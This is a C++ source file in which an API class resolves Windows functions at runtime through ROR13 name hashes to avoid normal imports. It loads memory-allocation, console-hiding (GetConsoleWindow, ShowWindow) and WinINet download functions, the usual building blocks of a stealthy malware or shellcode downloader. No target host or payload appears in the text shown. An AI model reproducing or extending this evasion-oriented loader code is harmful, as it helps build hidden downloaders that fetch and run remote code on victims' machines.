#include "API.h"
#include "Utils.h"
#include "Ror13Constants.h"

//constructor for our API class
API::API(void){
	char user32[] = USER32_DLL_STR;
	char wininet[] = WININET_DLL_STR;

	// ******* KERNEL32.DLL ******* //
	hKernel = find_module_by_hash(KERNEL32_DLL);
		HeapAlloc = (zHeapAlloc)find_function(hKernel, KERNEL32_DLL_HeapAlloc);
		HeapFree = (zHeapFree)find_function(hKernel, KERNEL32_DLL_HeapFree);
		GetProcessHeap = (zGetProcessHeap)find_function(hKernel, KERNEL32_DLL_GetProcessHeap);
		GetProcAddress = (zGetProcAddress)find_function(hKernel, KERNEL32_DLL_GetProcAddress);
		LoadLibraryA = (zLoadLibraryA)find_function(hKernel, KERNEL32_DLL_LoadLibraryA);
		FreeLibrary = (zFreeLibrary)find_function(hKernel, KERNEL32_DLL_FreeLibrary);
		VirtualAlloc = (zVirtualAlloc)find_function(hKernel, KERNEL32_DLL_VirtualAlloc);
		VirtualFree = (zVirtualFree)find_function(hKernel, KERNEL32_DLL_VirtualFree);
		GetConsoleWindow = (zGetConsoleWindow)find_function(hKernel, KERNEL32_DLL_GetConsoleWindow);

	// ******* USER32.DLL ******* //
	hUser = LoadLibraryA(user32);
		ShowWindow = (zShowWindow)find_function(hUser, USER32_DLL_ShowWindow);

	// ******* WININET.DLL ******* /
	hWininet = LoadLibraryA(wininet);
		InternetOpenA = (zInternetOpenA)find_function(hWininet, WININET_DLL_InternetOpenA);
		InternetOpenUrlA = (zInternetOpenUrlA)find_function(hWininet, WININET_DLL_InternetOpenUrlA);
		InternetReadFile = (zInternetReadFile)find_function(hWininet, WININET_DLL_InternetReadFile);
		InternetCloseHandle = (zInternetCloseHandle)find_function(hWininet, WININET_DLL_InternetCloseHandle);
		InternetQueryDataAvailable = (zInternetQueryDataAvailable)find_function(hWininet, WININET_DLL_InternetQueryDataAvailable);
}

//destructor - free our resources!
API::~API(void){
	this->FreeLibrary(hWininet);
	this->FreeLibrary(hUser);
	this->FreeLibrary(hKernel); // Need to make sure we don't use kernel32 after we free it
}